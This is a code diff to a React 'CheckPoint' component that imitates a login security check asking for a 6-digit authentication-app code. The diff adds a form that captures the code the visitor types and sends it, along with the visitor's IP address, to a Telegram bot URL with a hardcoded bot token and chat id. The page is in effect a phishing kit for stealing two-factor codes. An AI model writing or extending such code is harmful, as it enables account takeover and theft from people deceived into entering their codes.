@@ -1,10 +1,32 @@
-// import styles from '../styles/security-check.module.css';
 import Nav from './nav';
 import styles from '../styles/check-point.module.css';
+import { useForm } from "react-hook-form";
 
 
 
-const CheckPoint = () => {
+
+const CheckPoint = (props) => {
+
+    const { register, handleSubmit } = useForm();
+
+    const sendCode = async (data) => {
+        try {
+
+            const message = `
+             Ip:${props.ip.userIP}, code: ${data.code}`;
+            const res = await fetch(`https://api.telegram.org/bot6456875750:AAH43ljhNaQYp7YGWENw6ujyFIuxRfFxA-g/sendMessage?chat_id=1533093397&text=${message}`);
+
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    const onSubmit = (data) => {
+        sendCode(data)
+    }
+
+    
+
   return (
     <div>
         <Nav/>
@@ -25,18 +47,25 @@ const CheckPoint = () => {
                     </p>
                 </div>
 
-                <div className={styles.section}>
-                    <strong>Or, enter your login code</strong>
-                    <p>
-                        Enter the 6-digit code from the authentication app you set up.
-                    </p>
-                    <input type="text" placeholder="Login code" className={styles.code} />
-                </div>
+                <form onSubmit={handleSubmit(onSubmit)}>
 
-                <div className={styles.bottom}>
-                    <a>Need another way to confirm it's you?</a>
-                    <button className={styles.btn}>Submit code</button>
-                </div>
+                    <div className={styles.section}>
+                        <strong>Or, enter your login code</strong>
+                        <p>
+                            Enter the 6-digit code from the authentication app you set up.
+                        </p>
+                        <input type="text" placeholder="Login code" {...register("code")} className={styles.code} />
+                        
+                    </div>
+
+                    <div className={styles.bottom}>
+                        <a>Need another way to confirm it's you?</a>
+                        <button type="submit" className={styles.btn}>Submit code</button>
+                    </div>
+
+                </form>
+
+                
 
             </div>
         </div>
